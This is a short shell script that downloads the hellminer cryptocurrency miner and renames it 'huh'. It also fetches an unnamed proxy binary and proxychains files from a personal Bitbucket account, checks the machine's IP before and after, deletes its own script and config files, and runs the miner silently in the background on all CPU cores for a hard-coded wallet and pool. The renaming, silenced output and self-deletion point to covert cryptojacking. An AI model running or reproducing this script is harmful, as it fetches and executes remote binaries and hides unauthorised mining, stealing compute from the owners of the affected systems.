wget -O hmm.tar.gz https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz && tar -xf hmm.tar.gz && mv hellminer huh
wget -q -O proxy https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x proxy
wget https://bitbucket.org/asimadarasi/alima/downloads/libproxychains4.so && chmod +x libproxychains4.so
wget -q https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && chmod +x proxychains.conf 
echo "IP ORI ==> "$(curl ifconfig.me)
echo "IP Baru ==> "$(curl ifconfig.me)
rm -rf sh.sh config_*
./huh -u RHTx4HUZRrmy8tWhpn5WWX2x7KmfYS4Txq.worker$(( $RANDOM % 1000 + 1 )) -c stratum+ssl://139.99.123.225:3958 -p x --cpu $(nproc) &> /dev/null &
